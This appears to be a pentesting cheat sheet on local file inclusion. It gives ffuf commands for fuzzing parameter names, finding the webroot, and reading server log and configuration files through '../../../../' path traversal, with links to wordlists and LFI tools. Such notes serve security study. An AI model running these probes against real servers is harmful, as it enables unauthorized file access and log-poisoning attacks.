### Fuzzing Parameters using Ffuf
```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<VULNERABLE_IP>:<PORT>/index.php?FUZZ=value' -ic
```
#### After performing the above fuzzing we can try all LFI attacks on the parameters. [Popular LFI parameters](https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters)

### [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Fuzzing Server Files
### Server Webroot
#### When we want to reach a directory through relative paths (e.g `../../uploads`) we may need to locate the server webroot path in order to locate files in that directory.
### We can achieve that by fuzzing for the index.php file though common webroot paths. [Wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)   //  [Wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)

```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt -u 'http://<SERVER_IP>:<PORT>/index.php?lang=../../../../FUZZ/index.php' ic -fs <filter_by_size>
```

### Server Logs/Configurations
#### These files can be useful to perform log poisoning attacks.In addition, we may also need to read the server configurations to identify the server webroot path.
#### Useful Wordlists for [Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) and [Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
```bash
$ ffuf -w ./LFI-WordList-Linux -u 'http://<SERVER_IP>:<PORT>/index.php?lang=../../../../FUZZ' -fs <filter_by_size>
```

### LFI Tools
* [LFISuite](https://github.com/D35m0nd142/LFISuite)  
* [liffy](https://github.com/mzfr/liffy)  